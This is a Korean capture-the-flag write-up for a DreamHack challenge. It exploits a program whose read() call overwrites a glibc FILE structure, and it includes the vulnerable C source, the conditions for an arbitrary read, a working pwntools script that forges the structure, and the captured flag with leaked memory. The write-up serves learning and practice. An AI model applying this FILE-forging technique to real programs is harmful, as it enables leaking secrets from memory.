# [DreamHack] _IO_FILE Arbitrary Address Read

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: _IO_FILE Arbitrary Address Read에서 실습하는 문제입니다.
>
> Release: [_IO_FILE Arbitrary Address Read.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8550202/_IO_FILE.Arbitrary.Address.Read.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161878728-1d19fc28-4d09-4a88-915d-e050179026ae.png)

## Analysis

### Source code

```c
char flag_buf[1024];
FILE *fp;

int read_flag() {
	FILE *fp;
	fp = fopen("/home/iofile_aar/flag", "r");
	fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
	fclose(fp);
}

int main() {
  const char *data = "TEST FILE!";

  init();
  read_flag();

  fp = fopen("/tmp/testfile", "w");

  printf("Data: ");

  read(0, fp, 300);

  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}
```

`read(0, fp, 300)`에서 파일 구조체 전체를 덮을 수 있다. `flag_buf`에 저장된 플래그를 읽어오는 것이 목표이다.

## Exploit

다음의 조건들을 만족하면 `flag_buf`에 저장된 값을 읽어올 수 있다.

- `fp->_flags`의 `_IO_IS_APPENDING`(`0x1000`) 비트가 설정되어 있지 않아야 한다.
- `fp->_flags`의 `_IO_CURRENTLY_PUTTING`(`0x800`) 비트가 설정되어 있어야 한다.
- `fp->_IO_write_base`의 값이 `flag_buf`여야 한다.
- `fp->_IO_write_ptr`의 값이 `flag_buf + length`여야 한다.
- `fp->_IO_read_end`의 값이 `fp->_IO_write_base`와 같아야 한다.
- `fp->_fileno`가 1이어야 한다. (`stdout`으로 출력하기 위해서)

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/iofile_aar/iofile_aar')
else:
    r = remote('host1.dreamhack.games', 19917)

flag_buf = 0x6010a0  # global var <flag_buf>

payload = p64(0xfbad0800)  # flag
payload += p64(0)  # _IO_read_ptr
payload += p64(flag_buf)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(flag_buf)  # _IO_write_base
payload += p64(flag_buf + 0x50)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(0)  # _IO_buf_base
payload += p64(0)  # _IO_buf_end
payload += p64(0)  # _IO_save_base
payload += p64(0)  # _IO_backup_base
payload += p64(0)  # _IO_save_end
payload += p64(0)  # _markers
payload += p64(0)  # _chain
payload += p32(1)  # _fileno

r.sendafter('Data: ', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 19917: Done
[*] Switching to interactive mode
DH{42b4dc5cc3f44173a95bbe7901b8aba3}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00TEST FILE!\x00\x00tmp/testfile\x00ata: \x00\x00\x1b\x03L\x00\x00\x00\x00\xfc\xff\xff\xa8\x00\xfd\xff\xffh\x00\xfd\xff\xff\x94\x00\xfe\xff\xff\xd0\x00J\xfe\xff\xff\xf0\x95\xfe\xff\xff\x10\x00@\xff\xff\xff0\x00\xb0\xff\xff\xffx\x00\x00\x00\x14\x00\x00\x00zR\x00x\x10\x1b\x0\x90\x07\x10\x00\x1c\x00\xb0\xfc\xff\xff+\x00\x00\x00\x00\x00\x00\x00zR\x00x\x10\x1b\x0\x90\x00\x10\x00\x1c\x00\xb4\xfc\xff\xff\x00\x00\x00\x00\x00\x00\x00\xfb\xff\xff\x80\x00\x00\x10\x0eJ\x0f\x80\x00\x1a*3$"\x00\x00\x1c\x00X\x00\x00\xfd\xff\xf\x06\x9c\x0\x00D\x00\x00\x00\x00\xfe\xff\xffe\x00\x00B\x0e\x8fB\x0e\x8e\x03\x0e\x8d\x04\x0e\x8c\x05\x0e\x86\x06\x0e\x83\x07\x0er\x0eA\x0eA\x0eB\x0eB\x0eB\x0eB\x0e\x00\x00\x00\x000\xfe\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\[*] Got EOF while reading in interactive
$
```